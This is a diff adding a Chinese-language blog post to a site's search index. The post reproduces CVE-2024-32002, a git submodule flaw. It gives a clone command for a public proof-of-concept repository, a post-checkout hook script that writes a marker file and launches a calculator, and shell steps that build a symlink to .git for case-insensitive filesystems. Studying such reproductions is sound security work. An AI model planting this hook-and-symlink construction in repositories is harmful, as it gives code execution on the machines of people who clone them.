@@ -539,4 +539,27 @@
         <tag>脚本</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CVE-2024-32002漏洞复现</title>
+    <url>/2024/07/01/CVE-2024-32002%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>git爆出巨大漏洞，针对的是程序员经常会用到的git clone这个命令。CVE-2024-32002 利用了 Git 在处理子模块时的一个缺陷，允许攻击者精心构造一个仓库，使 Git 将文件写入到 .git&#x2F; 目录而不是预期的子模块工作树中。这样一来，攻击者可以植入恶意的钩子脚本，在克隆操作仍在进行时即被执行，用户几乎无法事先检查即将执行的代码。</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>使用管理员权限打开git bash，（我的git版本是2.39.0）执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone --recursive git@github.com:amalmurali47/git_rce.git</span><br></pre></td></tr></table></figure>
+<p>执行后弹出计算器，说明代码构造者掌握了远程执行代码的能力</p>
+<img src="/2024/07/01/CVE-2024-32002%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" class title="This is an example image">
+
+<h2 id="关键代码解析"><a href="#关键代码解析" class="headerlink" title="关键代码解析"></a>关键代码解析</h2><h4 id="创建恶意钩子脚本"><a href="#创建恶意钩子脚本" class="headerlink" title="创建恶意钩子脚本"></a>创建恶意钩子脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;Hacked by debruyxuan&quot; &gt; /tmp/pwnd</span><br><span class="line">calc.exe</span><br><span class="line">open -a Calculator.app</span><br></pre></td></tr></table></figure>
+<p>在子模块的 hooks&#x2F;post-checkout 文件中编写代码，以在克隆过程中执行特定命令。</p>
+<h4 id="构造符号链接"><a href="#构造符号链接" class="headerlink" title="构造符号链接"></a>构造符号链接</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建 symlink</span></span><br><span class="line"><span class="comment"># 将字符串 &quot;.git&quot; 输出到 dotgit.txt 文件中</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;.git&quot;</span> &gt; dotgit.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 dotgit.txt 文件内容的哈希值，并将其内容作为一个 Git 对象存储在对象数据库中，</span></span><br><span class="line"><span class="comment"># 将哈希值写入 dot-git.hash 文件中</span></span><br><span class="line">git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 dot-git.hash 文件中读取哈希值，并生成索引信息格式：</span></span><br><span class="line"><span class="comment"># 120000 表示符号链接的文件模式，</span></span><br><span class="line"><span class="comment"># %s 是哈希值占位符，</span></span><br><span class="line"><span class="comment"># 0 表示阶段号，</span></span><br><span class="line"><span class="comment"># a 表示文件路径</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;120000 %s 0\ta\n&quot;</span> <span class="string">&quot;<span class="subst">$(cat dot-git.hash)</span>&quot;</span> &gt; index.info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新 Git 索引，将生成的索引信息（即符号链接）添加到索引中</span></span><br><span class="line">git update-index --index-info &lt; index.info</span><br></pre></td></tr></table></figure>
+<p>在主仓库中创建一个指向 .git&#x2F; 目录的符号链接，利用大小写不敏感文件系统的特性。</p>
+]]></content>
+      <categories>
+        <category>网安</category>
+      </categories>
+      <tags>
+        <tag>脚本</tag>
+        <tag>网安</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
 </search>
